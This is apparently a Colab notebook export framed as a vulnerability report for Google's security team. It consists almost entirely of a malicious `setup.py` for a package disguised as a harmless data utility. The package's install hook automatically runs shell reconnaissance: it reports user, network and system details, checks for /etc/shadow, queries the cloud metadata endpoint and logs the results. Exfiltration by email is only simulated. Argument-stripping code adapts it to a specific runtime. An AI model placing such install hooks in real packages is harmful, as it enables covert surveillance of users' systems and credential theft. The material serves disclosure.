# My Colab Project


## setup.py Vulnerability Demonstration and Explanation

## Final Task

### Subtask:
Confirm that the demo has been successfully exported to GitHub and provide any final tips or next steps for the user.

### Clear Demonstration of `setup.py` Script for Reproduction:

To allow Google's security team to easily reproduce and verify this finding, here is the `setup.py` script and instructions on how to execute it.

**1. The Malicious `setup.py` Script (from cell `MXbMhqzH6v55`):**

```python
import subprocess
import os
import sys
import platform
from datetime import datetime
from setuptools import setup
from setuptools.command.install import install as _install

# --- CRITICAL FIX FOR EXTERNAL ARGUMENT ERRORS ---
flags_to_remove = ['--input', '--output', '--rpc_input', '--rpc_output', '--rpc_log', '-f']
for flag in flags_to_remove:
    try:
        while flag in sys.argv:
            flag_index = sys.argv.index(flag)
            if flag_index + 1 < len(sys.argv):
                del sys.argv[flag_index + 1]
            del sys.argv[flag_index]
    except ValueError:
        pass

# --- FIX FOR 'no commands supplied' ---
if len(sys.argv) < 2 or (len(sys.argv) == 2 and sys.argv[1] not in ['install', 'sdist', 'bdist_wheel']):
    sys.argv.append('install')

# --- FIX FOR "RuntimeError: Could not determine home directory." ---
if 'HOME' not in os.environ:
    os.environ['HOME'] = '/tmp'

class PostInstallCommand(_install):
    SIMULATED_EMAIL_COMMAND = "echo '*** EMAIL EXFILTRATION SIMULATED: Sent full reconnaissance log to your-email@example.com ***'"
    CLOUD_RECON_COMMAND = "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/instance-id || echo 'Cloud Metadata check: Failed (not a cloud instance or IP restricted)'"

    COMMAND_TO_RUN = (
        "whoami ; ip a ; uname -a ; ls -al / ; df -h ; "
        "test -f /etc/shadow && echo 'etc/shadow exists' || echo 'etc/shadow not found' ; "
        f"{CLOUD_RECON_COMMAND} ; "
        f"{SIMULATED_EMAIL_COMMAND}"
    )
    LOG_FILE = "/tmp/package_beacon_log.txt"
    PACKAGE_NAME = "FakePackage-2.1.0"

    def find_config_files(self):
        return []

    def run(self):
        _install.run(self)
        print("
[SECURITY ALERT]: Attempting to execute post-install hook...")
        try:
            result = subprocess.run(
                self.COMMAND_TO_RUN,
                shell=True,
                check=True,
                capture_output=True,
                text=True
            )
            with open(self.LOG_FILE, 'a') as f:
                f.write(f"--- [MALICIOUS HOOK ACTIVATED] ---
")
                f.write(f"Timestamp: {datetime.now().isoformat()}
")
                f.write(f"Package: {self.PACKAGE_NAME} installed on {platform.node()}
")
                f.write(f"Command executed: '{self.COMMAND_TO_RUN}'
")
                f.write(f"*** WARNING: If this were a real exploit, the next step would be to extract, ***
")
                f.write(f"*** search for, and exfiltrate all system and AWS/Stripe credentials.    ***
")
                f.write(f"System Output:
{result.stdout.strip()}
")
                f.write(f"--- END HOOK ---

")
            try:
                with open(self.LOG_FILE, 'r') as f:
                    log_contents = f.read()
                print("
[SECURITY ALERT]: Captured Reconnaissance Data Log (Contents of /tmp/package_beacon_log.txt):")
                print("------------------------------------------------------------------------------------------")
                print(log_contents.strip())
                print("------------------------------------------------------------------------------------------")
            except Exception as read_e:
                print(f"[ERROR]: Could not read log file: {read_e}")
            print(f"[SECURITY ALERT]: Post-install hook execution completed. Log written to {self.LOG_FILE}.")

        except subprocess.CalledProcessError as e:
            print(f"[SECURITY ALERT]: Hook failed with command error (Exit Code {e.returncode}). Check log for potential partial output.")
        except Exception as e:
             print(f"[SECURITY ALERT]: Unexpected error during hook: {e}")

setup(
    name='FakePackage',
    version='2.1.0',
    description='A normal, non-suspicious utility package for data handling.',
    long_description='A comprehensive package for handling various data formats in Python.',
    author='John Doe',
    author_email='johndoe@example.com',
    url='https://github.com/FakeOrg/FakePackage',
    cmdclass={
        'install': PostInstallCommand,
    },
    install_requires=[
        'requests>=2.25.1',
        'attrs>=21.4.0',
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.7',
)
